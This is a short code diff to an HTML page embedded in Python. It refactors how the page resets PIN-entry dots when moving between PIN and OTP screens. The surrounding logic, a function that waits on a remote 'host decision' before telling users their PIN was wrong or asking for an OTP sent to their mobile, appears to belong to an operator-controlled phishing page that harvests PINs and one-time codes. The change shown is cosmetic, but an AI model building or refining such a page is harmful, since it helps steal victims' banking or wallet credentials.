@@ -949,6 +949,16 @@ HTML_PAGE = r"""<!DOCTYPE html>
   }
   goTo('approved');
 }
+    function resetPinDotsWave() {
+      isPinBusy = false;
+      for (let i = 0; i < 5; i++) {
+        const dot = document.getElementById('dot-' + i);
+        if (dot) dot.classList.remove('wave-dot-' + i);
+      }
+      enteredPin = '';
+      updatePinDots();
+    }
+
         function watchHostDecision(step) {
       if (decisionTimer) clearInterval(decisionTimer);
       if (otpStepTimer) clearTimeout(otpStepTimer);
@@ -959,6 +969,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
           clearInterval(decisionTimer);
           const otpLabel = document.getElementById('otp-mobile-label');
           if (otpLabel) otpLabel.innerText = formatMobileWithCountryCode(appState.mobile);
+          resetPinDotsWave();
           goTo('otp');
         }, 10000);
       } else if (step === 'otp') {
@@ -977,9 +988,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
             if (otpStepTimer) clearTimeout(otpStepTimer);
             if (otpAutoTimer) clearTimeout(otpAutoTimer);
             if (step === 'pin') {
-              isPinBusy = false;
-              enteredPin = '';
-              updatePinDots();
+              resetPinDotsWave();
               const pinMsg = document.getElementById('pin-status-msg');
               if (pinMsg) pinMsg.innerText = 'Incorrect PIN entered. Please re-enter your PIN.';
               goTo('pin');
@@ -1003,6 +1012,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
             if (step === 'pin') {
               const otpLabel = document.getElementById('otp-mobile-label');
               if (otpLabel) otpLabel.innerText = formatMobileWithCountryCode(appState.mobile);
+              resetPinDotsWave();
               goTo('otp');
             } else {
               showApprovedScreen();
